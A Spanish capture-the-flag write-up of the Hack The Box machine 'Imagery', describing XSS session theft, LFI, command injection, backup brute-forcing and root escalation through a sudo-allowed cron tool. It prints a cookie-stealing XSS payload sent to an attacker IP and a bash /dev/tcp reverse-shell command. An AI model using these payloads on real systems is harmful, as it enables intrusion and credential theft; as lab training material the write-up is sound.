---
title: "Imagery" 
platform: "Hackthebox"
date: "2026-02-27" 
difficulty: "Medium" 
os: "Linux" 
description: "Resolución de la máquina Analysis de HackTheBox." 
---

#Medium #XSS #linux #LFI  

-------------

Imagery es una máquina de dificultad media que pone a prueba habilidades de inyección web y análisis forense de archivos. La intrusión comienza con un XSS para el secuestro de sesiones, seguido de un LFI y un RCE mediante la manipulación de funciones de procesamiento de imágenes. La escalada de privilegios implica el descifrado de copias de seguridad mediante fuerza bruta y el abuso de un binario con permisos de Sudo.

1. Fase de Reconocimiento y Enumeración
Iniciamos con un escaneo de puertos con nmap para identificar los servicios expuestos:

![[Pasted image 20260112195654.png]]
![[Pasted image 20260112200522.png]]

Identificamos los servicios estándar (SSH y HTTP). Al explorar la web, encontramos una plataforma para subir y gestionar imágenes. Realizamos un fuzzing de directorios para descubrir rutas ocultas:

![[Pasted image 20260112202339.png]]

2. Explotación Web: De XSS a RCE
Secuestro de Sesión (Session Hijacking)
Detectamos un formulario de reporte de bugs en el footer. Probamos un XSS (Cross-Site Scripting) para intentar capturar la cookie de sesión del administrador inyectando un payload que redirija la cookie a nuestro servidor:

HTML
`<img src=x onerror="document.location='http://10.10.15.121/?cookie='+document.cookie">`
![[Pasted image 20260112205524.png]]

Obtenemos la cookie y accedemos al panel de administración.

LFI y Exfiltración de Datos
Dentro del panel, interceptamos la petición de descarga de logs y confirmamos una vulnerabilidad de LFI (Local File Inclusion), permitiéndonos leer archivos del sistema como /etc/passwd.

![[Pasted image 20260119165640.png]]

Tras analizar los archivos de configuración de la aplicación (Flask), obtenemos hashes de usuarios. Logramos crackear la contraseña del usuario testuser (iambatman), quien tiene acceso a funciones avanzadas de transformación de imágenes.

Ejecución Remota de Comandos (RCE)
Al interceptar las peticiones de transformación de imágenes, detectamos que los parámetros son vulnerables a inyección de comandos. Explotamos esto para obtener una reverse shell codificando el payload en base64:

![[Pasted image 20260119173925.png]]

3. Post-Explotación y Movimiento Lateral
Descifrado de Backups
Enumerando el sistema, localizamos un backup cifrado en /var/backup/web_20250806_120723.zip.aes. Utilizamos un script de Python personalizado para realizar fuerza bruta sobre el archivo utilizando rockyou.txt y la librería pyAesCrypt.

![[Pasted image 20260119180922.png]]

Dentro del backup, encontramos un archivo db.json con hashes MD5. Crackeamos el hash del usuario mark y logramos pivotar mediante SSH para obtener la flag de usuario.

![[Pasted image 20260119181702.png]]

4. Escalada de Privilegios: Abuso de Charcol
Revisamos los privilegios de sudo y encontramos que el usuario mark puede ejecutar el binario /usr/bin/charcol con privilegios de root.

![[Pasted image 20260119181836.png]]

Explotación de Tareas Programadas
El binario charcol permite gestionar tareas programadas (cron). Aprovechamos esta funcionalidad para añadir una tarea que ejecute una reverse shell con privilegios de root:

Bash
`charcol> auto add --schedule "* * * * *" --command "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.197/443 0>&1'" --name "rev_root"`
Al minuto, recibimos la conexión en nuestro listener, obteniendo control total sobre la máquina.

![[Pasted image 20260202170648.png]]

Máquina Imagery comprometida. 🚀